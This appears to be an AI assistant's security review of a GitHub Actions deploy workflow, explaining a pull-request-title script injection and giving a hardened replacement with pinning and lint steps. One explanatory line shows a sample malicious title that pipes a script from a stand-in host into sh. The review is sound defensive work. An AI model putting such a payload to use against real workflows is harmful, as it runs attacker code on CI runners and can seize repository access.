The current version is **not safe**, and I couldn't fix it myself. This session gives me only search and read tools for files, with no way to edit or run commands. Below is the corrected file for you to apply.

## The problem

`.github/workflows/deploy.yml:14`:

```yaml
- run: echo "Title is ${{ github.event.pull_request.title }}"
```

GitHub pastes the value of `${{ }}` into the script text before the shell runs it. Whoever opens the pull request picks the title. A title like `"; curl https://evil.example/x.sh | sh; echo "` closes the quotes and runs their own commands on the runner.

Two other settings make it worse:
- **`permissions: write-all`** (line 7): for a pull request from a branch in this repo, that injected code gets a token that can write to almost everything in the repo. That includes pushing code, editing releases and changing workflows.
- **`actions/checkout` keeps the token**: by default it saves the token in `.git/config`, where any later step can read it.

A pull request from a fork gets a read-only token and no secrets. Even so, the injected code still runs, and it would become a full repo takeover if this trigger were ever changed to `pull_request_target`.

## The fix

```yaml
---
name: deploy

on:
  pull_request:

permissions: {}

jobs:
  deploy:
    name: Deploy
    runs-on: ubuntu-latest
    timeout-minutes: 10
    permissions:
      contents: read
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4 # TODO: pin to the full commit SHA of the latest release
        with:
          persist-credentials: false

      - name: Report the pull request title
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: printf 'Title is %s\n' "$PR_TITLE"
```

What changed:
1. **Injection:** the title now goes in through `env:` and is used as the quoted variable `"$PR_TITLE"`. The shell treats it as plain text, not as code. `printf '%s'` also avoids `echo`'s handling of a title that starts with `-n` or `-e`.
2. **Permissions:** `permissions: {}` at the top so nothing is granted by default, then only `contents: read` for this job. If the real deploy step needs more, add just that scope to this job.
3. **Saved token:** `persist-credentials: false` on checkout.
4. **Timeout:** `timeout-minutes: 10` instead of the default 6 hours.

## Still to do

- **Pin checkout to a commit SHA.** `@v4` is a tag, and tags can be moved. I couldn't look up the real SHA, and I won't guess one. Run:
  ```sh
  gh api repos/actions/checkout/releases/latest --jq .tag_name
  gh api repos/actions/checkout/commits/refs/tags/<tag> --jq .sha
  ```
  Then use `uses: actions/checkout@<sha> # <tag>`. The latest release is probably newer than v4, so check its release notes for breaking changes.
- **Run the checks.** I couldn't run them, so nothing here is checked yet:
  ```sh
  docker run --rm -v "$PWD:/repo" -w /repo rhysd/actionlint@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667 -color
  uvx "zizmor@1.31.1" --persona=pedantic .
  ```
  `actionlint` checks the workflow syntax and `zizmor` checks it for security issues. `zizmor` will flag the unpinned checkout until it has a SHA.
- **Check the trigger.** A workflow named `deploy` that runs on every pull request is unusual. If it really deploys, it may belong on `push` to the main branch, or behind a protected environment.
